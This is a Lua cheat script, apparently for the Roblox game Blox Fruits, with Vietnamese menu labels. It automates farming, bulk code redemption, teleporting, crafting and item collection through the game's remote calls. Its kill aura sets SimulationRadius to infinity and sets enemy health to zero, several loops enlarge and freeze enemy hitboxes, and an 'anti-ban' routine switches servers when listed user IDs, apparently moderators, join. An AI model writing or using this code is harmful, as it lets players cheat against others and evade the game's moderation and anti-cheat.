local codes = {"KITT_RESET", "Sub2UncleKizaru", "SUB2GAMERROBOT_RESET1", "Sub2Fer999", "Enyu_is_Pro", "JCWK", "StarcodeHEO", "MagicBus", "KittGaming", "Sub2CaptainMaui", "Sub2OfficalNoobie", "TheGreatAce", "Sub2NoobMaster123", "Sub2Daigrock", "Axiore", "StrawHatMaine", "TantaiGaming", "Bluxxy", "SUB2GAMERROBOT_EXP1", "Chandler", "NOMOREHACK", "BANEXPLOIT", "WildDares", "BossBuild", "GetPranked", "EARN_FRUITS", "FIGHT4FRUIT", "NOEXPLOITER", "NOOB2ADMIN", "CODESLIDE", "ADMINHACKED", "ADMINDARES", "fruitconcepts", "krazydares", "TRIPLEABUSE", "SEATROLLING", "24NOADMIN", "REWARDFUN", "NEWTROLL", "fudd10_v2", "Fudd10", "Bignews", "SECRET_ADMIN"}
Tabs.Misc:AddButton({
    Title="Nhập Hết",
    Description="",
    Callback=function()
        for _, code in ipairs(codes) do
            RedeemCode(code)  
        end
    end
})
function RedeemCode(Code)
    game:GetService("ReplicatedStorage").Remotes.Redeem:InvokeServer(Code)
end
local Mastery = Tabs.Misc:AddSection("Danh Hiệu")
Tabs.Misc:AddButton({
    Title="Danh Hiệu",
    Description="",
    Callback=function()
        local args = {
            [1]="getTitles"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        game.Players.localPlayer.PlayerGui.Main.Titles.Visible=true
    end
})
local Mastery = Tabs.Misc:AddSection("Thức Tỉnh")  
Tabs.Misc:AddButton({
    Title="Thức Tỉnh",
    Description="",
    Callback=function()
        game:GetService("Players").LocalPlayer.PlayerGui.Main.AwakeningToggler.Visible=true
    end
})
local Mastery = Tabs.Misc:AddSection("Khác")
local ToggleRejoin = Tabs.Misc:AddToggle("ToggleRejoin", {Title="Tham Gia Máy Chủ Lại", Description="",Default=true })
ToggleRejoin:OnChanged(function(Value)
    _G.AutoRejoin=Value
end)
Options.ToggleRejoin:SetValue(true)
spawn(function()
    while wait() do
        if _G.AutoRejoin then
                getgenv().rejoin=game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
                    if child.Name=='ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
                        game:GetService("TeleportService"):Teleport(game.PlaceId)
                    end
                 end)
            end
        end
    end)
local Mastery = Tabs.Misc:AddSection("Sương")
local function NoFog()
    local lighting = game:GetService("Lighting")
    if lighting:FindFirstChild("BaseAtmosphere") then
        lighting.BaseAtmosphere:Destroy()
    end
    if lighting:FindFirstChild("SeaTerrorCC") then
        lighting.SeaTerrorCC:Destroy()
    end
    if lighting:FindFirstChild("LightingLayers") then
        if lighting.LightingLayers:FindFirstChild("Atmosphere") then
            lighting.LightingLayers.Atmosphere:Destroy()
        end
        wait()
        if lighting.LightingLayers:FindFirstChild("DarkFog") then
            lighting.LightingLayers.DarkFog:Destroy()
        end
    end
    lighting.FogEnd=100000
end
Tabs.Misc:AddButton({
    Title="Xóa Sương Mù",
    Description="",
    Callback=function()
        NoFog()
    end
})
local ToggleAntiBand = Tabs.Misc:AddToggle("ToggleAntiBand", {
    Title="Chống Band",
    Description="",
    Default=true
})
ToggleAntiBand:OnChanged(function(Value)
    _G.AntiBand=Value
end)
local dangerousIDs = {17884881, 120173604, 912348}
spawn(function()
    while wait() do
        if _G.AntiBand then
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if table.find(dangerousIDs, player.UserId) then
                    Hop()
                end
            end
        end
    end
end)
local Mastery = Tabs.Sea:AddSection("Leviathan")
Tabs.Sea:AddButton({
    Title="Mua Chip Leviathan",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("InfoLeviathan", "2")
    end
})
local ToggleTPFrozenDimension = Tabs.Sea:AddToggle("ToggleTPFrozenDimension", {
    Title="Bay Đến Đảo Leviathan", 
    Description="", 
    Default=false 
})
ToggleTPFrozenDimension:OnChanged(function(Value)
    _G.TweenToFrozenDimension=Value
end)
ToggleTPFrozenDimension:SetValue(false)
spawn(function()
    local island
    while not island do
        island=game:GetService("Workspace").Map:FindFirstChild("FrozenDimension")
        wait()
    end
    while wait() do
        if _G.TweenToFrozenDimension then
            if island then
                Tween(island.CFrame)  
            end
        end
    end
end)
if Sea3 then
    local BribeLeviathan = Tabs.Sea:AddParagraph({
        Title="Trạng Thái Chip Leviathan",
        Content=""
    })
    spawn(function()
        pcall(function()
            while wait() do
                local bribeStatus = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("InfoLeviathan", "1")
                if bribeStatus==5 then
                    BribeLeviathan:SetDesc("Leviathan Is Out There")
                elseif bribeStatus==0 then
                    BribeLeviathan:SetDesc("I Don't Know")
                else
                    BribeLeviathan:SetDesc("Mua: " .. tostring(bribeStatus))
                end
            end
        end)
    end)
end
local Blaze = Tabs.Sea:AddSection("Draco")
local ToggleBlazeEmber = Tabs.Sea:AddToggle("ToggleBlazeEmber", {
    Title="Lụm Lửa Đỏ", 
    Description="", 
    Default=false
})
ToggleBlazeEmber:OnChanged(function(Value)
    _G.AutoBlazeEmber=Value
end)
spawn(function()
    while wait() do
        if _G.AutoBlazeEmber then
            pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RE/DragonDojoEmber"):FireServer()
            end)
        end
    end
end)
local ToggleBlazeEmberFarm = Tabs.Sea:AddToggle("ToggleBlazeEmberFarm", {
    Title = "Đấm Hydra Enforcer + Venomous Assailant", 
    Description = "", 
    Default = false
})
ToggleBlazeEmberFarm:OnChanged(function(Value)
    _G.AutoBlazeEmberFarm = Value
end)
spawn(function()
    while task.wait() do
        if _G.AutoBlazeEmberFarm then  
            pcall(function()
                local enemies = game:GetService('Workspace').Enemies
                if enemies:FindFirstChild('Hydra Enforcer') or enemies:FindFirstChild('Venomous Assailant') then
                    for _, v in pairs(enemies:GetChildren()) do
                        if v.Name == 'Hydra Enforcer' or v.Name == 'Venomous Assailant' then
                            if v:FindFirstChild('Humanoid') and v:FindFirstChild('HumanoidRootPart') and v.Humanoid.Health > 0 then
                                repeat
                                    wait(_G.Fast_Delay)
                                    
                                    Click()


AutoHaki()
                                    bringmob = true
                                    EquipWeapon(SelectWeapon)
                                    Tween(v.HumanoidRootPart.CFrame * Pos)
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    v.HumanoidRootPart.Transparency = 1
                                    v.Humanoid.JumpPower = 0
                                    v.Humanoid.WalkSpeed = 0
                                    v.HumanoidRootPart.CanCollide = false
                                    FarmPos = v.HumanoidRootPart.CFrame
                                    MonFarm = v.Name
                                until not _G.AutoBlazeEmberFarm or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    Tween(CFrame.new(4612.078125, 1002.283447265625, 498.2188720703125))
                end
            end)
        end
    end
end)
local ToggleReceiveQuest = Tabs.Sea:AddToggle("ToggleReceiveQuest", {
    Title="Nhận Nhiệm Vụ Lửa Đỏ", 
    Description="Bật Lên 1 Lần Là Nhận 1 Nhận Nữa Thì Tắt Bật Lại", 
    Default=false
})
ToggleReceiveQuest:OnChanged(function(Value)
    _G.AutoReceiveQuest=Value
    if _G.AutoReceiveQuest then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5661.5322265625, 1013.0907592773438,-334.9649963378906))
        Tween(CFrame.new(5814.42724609375, 1208.3267822265625, 884.5785522460938))
        spawn(function()
            pcall(function()
                while wait() do
                    local args = {
                        [1]={
                            ["Context"]="RequestQuest"
                        }
                    }
                    game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RF/DragonHunter"):InvokeServer(unpack(args))
                    local checkArgs = {
                        [1]={
                            ["Context"]="Check"
                        }
                    }
                    local response = game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RF/DragonHunter"):InvokeServer(unpack(checkArgs))
                end
            end)
        end)
    end
end)
local BlazeEmberQuestStatus = Tabs.Sea:AddParagraph({
    Title="Trạng Thái Nhiệm Vụ Lửa Đỏ",
    Content=""
})
spawn(function()
    pcall(function()
        while wait() do
            local args = {
                [1]={
                    ["Context"]="Check"
                }
            }
            local response = game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RF/DragonHunter"):InvokeServer(unpack(args))
            if typeof(response)=="table" then
                for key, value in pairs(response) do
                    if value=="Defeat 3 Venomous Assailants on Hydra Island." then
                        BlazeEmberQuestStatus:SetDesc("Defeat 3 Venomous Assailants on Hydra Island.")
                    elseif value=="Defeat 3 Hydra Enforcers on Hydra Island." then
                        BlazeEmberQuestStatus:SetDesc("Defeat 3 Hydra Enforcers on Hydra Island.")
                    elseif value=="Destroy 10 trees on Hydra Island." then
                        BlazeEmberQuestStatus:SetDesc("Destroy 10 trees on Hydra Island.")
                    end
                end
            end
        end
    end)
end)
local ToggleHydraTree = Tabs.Sea:AddToggle("ToggleHydraTree", { 
    Title = "Phá Cây Ở Đảo Hydra", 
    Description = "", 
    Default = false 
})
ToggleHydraTree:OnChanged(function(Value)
    _G.AutoHydraTree = Value
end)
local function sendSkillKey(skillKey)
    local virtualInputManager = game:GetService("VirtualInputManager")
    virtualInputManager:SendKeyEvent(true, skillKey, false, game)
    virtualInputManager:SendKeyEvent(false, skillKey, false, game)
end
local function equipAndUseSkill(toolType)
    local player = game.Players.LocalPlayer
    local backpack = player.Backpack
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.ToolTip == toolType then
            item.Parent = player.Character  
            for _, skill in ipairs({"Z", "X", "C", "V", "F"}) do
                wait() 
                pcall(function() sendSkillKey(skill) end) 
            end
            item.Parent = backpack
            break
        end
    end
end
local targets = {
    CFrame.new(5288.61962890625, 1005.4000244140625, 392.43011474609375),
    CFrame.new(5343.39453125, 1004.1998901367188, 361.0687561035156),
    CFrame.new(5235.78564453125, 1004.1998901367188, 431.4530944824219),
    CFrame.new(5321.30615234375, 1004.1998901367188, 440.8951416015625),
    CFrame.new(5258.96484375, 1004.1998901367188, 345.5052490234375),
}
spawn(function()
    while wait() do
        if _G.AutoHydraTree then
            AutoHaki()  
            for _, target in ipairs(targets) do
                if not _G.AutoHydraTree then break end 
                Tween(target) 
                wait()
                local character = game.Players.LocalPlayer.Character
                if character and character:FindFirstChild("HumanoidRootPart") then
                    local distance = (character.HumanoidRootPart.Position - target.Position).Magnitude
                    if distance <= 1 then
                        equipAndUseSkill("Melee")
                        equipAndUseSkill("Sword")
                        equipAndUseSkill("Gun")
                    end
                end
            end
        end
    end
end)
Tabs.Sea:AddButton({
    Title="Bay Đến Khu Vực Dragon Dojo",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5661.5322265625, 1013.0907592773438,-334.9649963378906))
        Tween(CFrame.new(5814.42724609375, 1208.3267822265625, 884.5785522460938))
    end
})
Tabs.Sea:AddButton({
    Title="Chế Tạo Volcanic Magnet",
    Description="Cần 15 Lửa Đỏ+10 Sắt",
    Callback=function()
        local args = {
            [1]="CraftItem",
            [2]="Craft",
            [3]="Volcanic Magnet"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})
Tabs.Sea:AddButton({
    Title = "Chế Tạo Dino Hood",
    Description = "Cần 25 Xương Khủng Long + 10 Sừng Tê Giác",
    Callback = function()
        local args = {
            [1] = "CraftItem",
            [2] = "Craft",
            [3] = "DinoHood"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})
Tabs.Sea:AddButton({
    Title = "Chế Tạo T-Rex Skull",
    Description = "Cần 8 Xương Khủng Long + 5 Vảy Rồng",
    Callback = function()
        local args = {
            [1] = "CraftItem",
            [2] = "Craft",
            [3] = "TRexSkull"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})
local ToggleCollectFireFlowers = Tabs.Sea:AddToggle("ToggleCollectFireFlowers", {
    Title="Lụm Hoa Đỏ", 
    Description="", 
    Default=false
})
ToggleCollectFireFlowers:OnChanged(function(Value)
    _G.AutoCollectFireFlowers = Value
end)
spawn(function()
    while wait() do
        if _G.AutoCollectFireFlowers then
            local fireFlowersFolder = workspace:FindFirstChild("FireFlowers")
            if fireFlowersFolder then
                for _, obj in pairs(fireFlowersFolder:GetChildren()) do
                    if obj:IsA("Model") and obj.PrimaryPart then
                        local flowerPos = obj.PrimaryPart.Position
                        local playerPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                        local distance = (flowerPos - playerPos).Magnitude
                        if distance <= 1 then
                            game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                            wait(1.5)
                            game:GetService("VirtualInputManager"):SendKeyEvent(false, "E", false, game)
                        else
                            Tween(CFrame.new(flowerPos))
                        end
                    end
                end
            end
        end
    end
end)
local ToggleWhiteBelt = Tabs.Sea:AddToggle("ToggleWhiteBelt", {
    Title="Cày Đai Trắng",
    Description="",
    Default=false
})
ToggleWhiteBelt:OnChanged(function(Value)
    _G.AutoLevel=Value
    if Value then
        local args = {
            [1]={
                ["NPC"]="Dojo Trainer",
                ["Command"]="RequestQuest"
            }
        }
        game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack(args))
        spawn(function()
            while _G.AutoLevel do
                local claimArgs = {
                    [1]={
                        ["NPC"]="Dojo Trainer",
                        ["Command"]="ClaimQuest"
                    }
                }
                game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack(claimArgs))
                wait()  
            end
        end)
    end
end)
local DracoV4 = Tabs.Sea:AddParagraph({
    Title="Hoàn Thành Ải Draco V4 (Sớm Ra)",
    Content=""
})
local ToggleTrialTeleport = Tabs.Sea:AddToggle("ToggleTrialTeleport", {
    Title="Bay Đến Cửa Trial Tộc Draco", 
    Description="", 
    Default=false
})
ToggleTrialTeleport:OnChanged(function(Value)
    _G.AutoTrialTeleport = Value
end)
spawn(function()
    while wait() do
        if _G.AutoTrialTeleport then
            local trialTeleport = workspace.Map.PrehistoricIsland:FindFirstChild("TrialTeleport")
            if trialTeleport and trialTeleport:IsA("Part") then
                Tween(CFrame.new(trialTeleport.Position))
                local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - trialTeleport.Position).Magnitude
                if distance <= 1 then
                    _G.AutoTrialTeleport = false
                end
            end
        end
    end
end)
local Volcano = Tabs.Sea:AddSection("Đảo Dung Nham")
local Prehistoric = Tabs.Sea:AddParagraph({
    Title="Trạng Thái Đảo Dung Nham",
    Content=""
})
spawn(function()
    pcall(function()
        while wait() do
            if game:GetService("Workspace").Map:FindFirstChild("PrehistoricIsland") then
                Prehistoric:SetDesc("Đảo Dung Nham: ✅️")
            else
                Prehistoric:SetDesc("Đảo Dung Nham: ❌️")
            end
        end
    end)
end)
local ToggleTPVolcano = Tabs.Sea:AddToggle("ToggleTPVolcano", { 
    Title="Bay Đến Đảo Dung Nham", 
    Description="", 
    Default=false 
})
ToggleTPVolcano:OnChanged(function(Value)
    _G.TweenToPrehistoric=Value
end)
Options.ToggleTPVolcano:SetValue(false)
spawn(function()
    local island
    while not island do
        island=game:GetService("Workspace").Map:FindFirstChild("PrehistoricIsland")
        wait()
    end
    while wait() do
        if _G.TweenToPrehistoric then
            local prehistoricIslandCore = game:GetService("Workspace").Map:FindFirstChild("PrehistoricIsland")
            if prehistoricIslandCore then
                local relic = prehistoricIslandCore:FindFirstChild("Core") and prehistoricIslandCore.Core:FindFirstChild("PrehistoricRelic")
                local skull = relic and relic:FindFirstChild("Skull")
                if skull then
                    Tween(CFrame.new(skull.Position))
                    _G.TweenToPrehistoric=false
                end
            end
        end
    end
end)
local ToggleDefendVolcano = Tabs.Sea:AddToggle("ToggleDefendVolcano", {
    Title = "Phòng Thủ", 
    Description = "", 
    Default = false
})
ToggleDefendVolcano:OnChanged(function(Value)
    _G.AutoDefendVolcano = Value
end)
local ToggleMelee = Tabs.Sea:AddToggle("ToggleMelee", {
    Title = "Dùng Melee", 
    Description = "", 
    Default = false
})
ToggleMelee:OnChanged(function(Value)
    _G.UseMelee = Value
end)
local ToggleSword = Tabs.Sea:AddToggle("ToggleSword", {
    Title = "Dùng Sword", 
    Description = "", 
    Default = false
})
ToggleSword:OnChanged(function(Value)
    _G.UseSword = Value
end)
local ToggleGun = Tabs.Sea:AddToggle("ToggleGun", {
    Title = "Dùng Gun", 
    Description = "", 
    Default = false
})
ToggleGun:OnChanged(function(Value)
    _G.UseGun = Value
end)
local function useSkill(skillKey)
    game:GetService("VirtualInputManager"):SendKeyEvent(true, skillKey, false, game)
    game:GetService("VirtualInputManager"):SendKeyEvent(false, skillKey, false, game)
end
local function removeLava()
    local interiorLavaModel = game.Workspace.Map.PrehistoricIsland.Core:FindFirstChild("InteriorLava")
    if interiorLavaModel and interiorLavaModel:IsA("Model") then
        interiorLavaModel:Destroy()
    end
    local prehistoricIsland1 = game.Workspace.Map:FindFirstChild("PrehistoricIsland")
    if prehistoricIsland1 then
        for _, descendant in pairs(prehistoricIsland1:GetDescendants()) do
            if descendant:IsA("Part") and descendant.Name:lower():find("lava") then
                descendant:Destroy()
            end
        end
    end
    local prehistoricIsland2 = game.Workspace.Map:FindFirstChild("PrehistoricIsland")
    if prehistoricIsland2 then
        for _, model in pairs(prehistoricIsland2:GetDescendants()) do
            if model:IsA("Model") then
                for _, child in pairs(model:GetDescendants()) do
                    if child:IsA("MeshPart") and child.Name:lower():find("lava") then
                        child:Destroy()
                    end
                end
            end
        end
    end
end
local function findValidRock()
    local volcanoRocksFolder = game.Workspace.Map.PrehistoricIsland.Core.VolcanoRocks
    for _, Rock in pairs(volcanoRocksFolder:GetChildren()) do
        if Rock:IsA("Model") then
            local volcanorock = Rock:FindFirstChild("volcanorock")
            if volcanorock and volcanorock:IsA("MeshPart") then
                local color = volcanorock.Color
                if color == Color3.fromRGB(185, 53, 56) or color == Color3.fromRGB(185, 53, 57) then
                    return volcanorock
                end
            end
        end
    end
    return nil 
end
local function equipAndUseSkill(toolType)
    local player = game.Players.LocalPlayer
    local backpack = player.Backpack
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.ToolTip == toolType then
            item.Parent = player.Character 
            for _, skill in ipairs({"Z", "X", "C", "V", "F"}) do
                wait() 
                pcall(function() useSkill(skill) end) 
            end
            item.Parent = backpack
            break
        end
    end
end
spawn(function()
    while wait() do
        if _G.AutoDefendVolcano then
            AutoHaki() 
            pcall(removeLava) 
            local currentTarget = findValidRock() 
            if currentTarget then
                local targetPosition = CFrame.new(currentTarget.Position + Vector3.new(0, 0, 0))
                Tween(targetPosition) 
                local color = currentTarget.Color
                if color ~= Color3.fromRGB(185, 53, 56) and color ~= Color3.fromRGB(185, 53, 57) then
                    currentTarget = findValidRock() 
                else
                    local currentPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                    local distance = (currentPosition - currentTarget.Position - Vector3.new(0, 0, 0)).Magnitude
                    if distance <= 1 then
                        if _G.UseMelee then
                            equipAndUseSkill("Melee")
                        end
                        if _G.UseSword then
                            equipAndUseSkill("Sword")
                        end
                        if _G.UseGun then
                            equipAndUseSkill("Gun")
                        end
                    end
                    _G.TweenToPrehistoric = false
                end
            else
                _G.TweenToPrehistoric = true
            end
        end
    end
end)
local ToggleKillAura = Tabs.Sea:AddToggle("ToggleKillAura", {Title="Đấm Golems Aura",Description="", Default=false })
ToggleKillAura:OnChanged(function(Value)
    KillAura=Value
end)
Options.ToggleKillAura:SetValue(false)
spawn(function()
    while wait() do
        if KillAura then
            pcall(function()
                for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                        repeat task.wait()
                            sethiddenproperty(game:GetService('Players').LocalPlayer,"SimulationRadius",math.huge)
                            v.Humanoid.Health=0
                            v.HumanoidRootPart.CanCollide=false
                        until not KillAura or not v.Parent or v.Humanoid.Health<=0
                    end
                end
            end)
        end
    end
end)
local ToggleCollectBone = Tabs.Sea:AddToggle("ToggleCollectBone", {
    Title="Lụm Xương", 
    Description="", 
    Default=false
})
ToggleCollectBone:OnChanged(function(Value)
    _G.AutoCollectBone=Value
end)
spawn(function()
    while wait() do
        if _G.AutoCollectBone then
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Name=="DinoBone" then
                    Tween(CFrame.new(obj.Position))
                end
            end
        end
    end
end)
local ToggleCollectEgg = Tabs.Sea:AddToggle("ToggleCollectEgg", {
    Title = "Lụm Trứng",
    Description = "",
    Default = false
})
ToggleCollectEgg:OnChanged(function(Value)
    _G.AutoCollectEgg = Value
end)
spawn(function()
    while wait() do
        if _G.AutoCollectEgg then
            local dragonEggs = workspace.Map.PrehistoricIsland.Core.SpawnedDragonEggs:GetChildren()
            if #dragonEggs > 0 then
                local randomEgg = dragonEggs[math.random(1, #dragonEggs)]
                if randomEgg:IsA("Model") and randomEgg.PrimaryPart then
                    Tween(randomEgg.PrimaryPart.CFrame)
                    local playerPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                    local eggPosition = randomEgg.PrimaryPart.Position
                    local distance = (playerPosition - eggPosition).Magnitude
                    if distance <= 1 then
                        game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                        wait(1.5)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false, "E", false, game)
                    end
                end
            end
        end
    end
end)
